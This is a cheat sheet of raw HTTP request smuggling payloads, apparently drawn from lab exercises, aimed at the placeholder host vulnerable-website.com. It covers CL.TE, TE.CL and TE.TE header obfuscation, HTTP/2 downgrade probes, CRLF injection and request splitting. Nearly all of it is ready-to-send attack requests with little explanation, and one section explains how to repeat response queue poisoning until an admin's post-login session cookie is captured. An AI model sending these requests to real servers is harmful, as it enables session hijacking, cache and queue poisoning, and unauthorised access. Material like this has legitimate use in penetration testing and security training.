# Request Smuggling

## Finding CL.TE vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

a
b
```

## Finding TE.CL vulnerabilities using timing techniques
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100
Transfer-Encoding: chunked

0

x
```

## CL.TE vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## TE.CL vulnerabilities
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-length: 4
Transfer-Encoding: chunked

2b
GPOST / HTTP/1.1
Content-Length: 15

x=1
0
\r\n
\r\n
```

## TE.TE behavior: obfuscating the TE header
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## Finding H2.CL vulnerabilities using 404 techniques
```
POST / HTTP/2
Host: vulnerable-website.com
Content-Length: 0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## Finding H2.TE vulnerabilities using 404 techniques
```
POST / HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## Response queue poisoning via H2.TE request smuggling
```
POST /x HTTP/2
Host: vulnerable-website.com
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: vulnerable-website.com
\r\n
\r\n
```
Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin's new post-login session cookie.

## HTTP/2 request smuggling via CRLF injection
```
POST / HTTP/2
Host: vulnerable-website.com
Foo: bar\r\nTransfer-Encoding: chunked

0

SMUGGLED
```
Observe that every second request you send receives a 404 response, confirming that you have caused the back-end to append the subsequent request to the smuggled prefix.

## HTTP/2 request splitting via CRLF injection
<table>
    <tr>
        <td>:method</td>
        <td>GET</td>
    </tr>
    <tr>
        <td>:path</td>
        <td>/x</td>
    </tr>
    <tr>
        <td>:authority</td>
        <td>vulnerable-website.com</td>
    </tr>
    <tr>
        <td>foo</td>
        <td>
            <p>bar\r\n<br>
            \r\n<br>
            GET /x HTTP/1.1\r\n<br>
            Host: vulnerable-website.com</p>
        </td>
    </tr>
</table>
